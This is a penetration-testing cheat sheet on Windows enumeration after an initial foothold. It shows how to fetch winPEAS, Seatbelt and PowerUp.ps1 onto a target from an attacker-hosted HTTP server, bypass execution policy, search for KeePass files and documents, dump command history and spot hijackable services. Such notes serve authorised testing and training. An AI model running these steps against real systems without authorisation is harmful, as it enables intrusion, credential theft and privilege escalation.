# Windows Enumeration
Having gained a foothold on a Windows machine by whatever mechanism the following items are important steps for us to gain situational awareness, with each item potentially proving critical to a successful effort at privilege escalation or lateral movement:

## Automatic Enumeration

### winPEAS
Tool for the automatic discovery of interesting files, permissions misconfigurations etc.

In Kali:
```bash
cp /usr/share/peass/winpeas/winPEASx64.exe .
python3 -m http.server 80
```
On the target machine:
```powershell
iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe
```
### Seatbelt
Similar to `winPEAS` but different? Search for `compiled seatbelt github download`, and grab the `Seatbelt.exe` file. Transfer to target in the usual fashion:
```bash
python3 -m http.server 80
```
And run on the target:
```powershell
iwr -uri http://192.168.118.2/Seatbelt.exe -Outfile Seatbelt.exe
.\Seatbelt.exe -group=all
```
### PowerUp.ps1
Nb. This tool (like most) should not be trusted implicitly always and if it offers no/insufficient usable information then manual techniques should be employed.
```bash
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python3 -m http.server 80
```
```powershell
iwr -uri http://<our IP>/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile
```

Look upon our exploitable shit ye mighty and despair!

## Manual Enumeration

### Username and hostname
```cmd
whoami
```
### Group memberships of the current user
```cmd
whoami /groups
```
### Our current privilege
```cmd
whoami /priv
```
### Existing users and groups
```powershell
Get-LocalUser
```
```powershell
Get-LocalGroup
```
```powershell
Get-LocalGroupMember adminteam
```
```powershell
Get-LocalGroupMember Administrators
```
CMD command for miscllelaneous info on a particular user:
```cmd
net user <username>
```
### Operating system, version and architecture
```powershell
systeminfo
```
### Network information
To list all network interfaces:
```powershell
ipconfig /all
```
To display the routing table and potentially enumerate links to other systems or networks that haven't yet been enumerated:
```powershell
route print
```
To enumerate the active network connections on a Windows system (with no DNS resolution):
```powershell
netstat -ano
```
### Installed applications
To enumerate all 32 bit applications installed on the machine:
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
and for the 64 bit applications:
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
Nb. this is not necessarily a complete list, never forget to check the `C:\ProgramFiles*` directories, as well as the `C:\tools` and `Downloads` paths.
### Running processes
```powershell
Get-Process
```
To find the binary running that process:
```powershell
Get-Process | Select-Object Path
```
### Finding Critical Files
KeePass files:
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
XAMPP Web Server config:
```powershell
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```
Misc. Data File Discovery:
```powershell
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini -File -Recurse -ErrorAction SilentlyContinue
```

### Impersonation
If we have a GUI session then we can run a new session as a different user with:
```powershell
runas /user:admin cmd
```

### Command History
```powershell
Get-History
```
```powershell
(Get-PSReadlineOption).HistorySavePath | ForEach-Object {cat $_}
```

### Installed Windows Services
Necessary to run this in an RDP session since `Get-CimInstance` (and `Get-Service` for that matter) will produce permission denied errors in a shell or WinRM session:
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```
Get starting mode of a win32 service, in the event we can't restart it and this value is set to `Auto` then a system reboot could let us hijack the service having previously edited the executable:
```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<target service>'}
```

### icacls
Enumerate which users/groups have what privileges on a binary (nb. beneficial to use `icacls` over `Get-ACL` since the former will work on `cmd` as well!):
```powershell
icacls "C:\path\to\interesting.exe"
```
Mask to permissions mapping (nb. A preceding 'I' indicates the access right is inherited):

- F 	Full access
- M 	Modify access
- RX 	Read and execute access
- R 	Read-only access
- W 	Write-only access
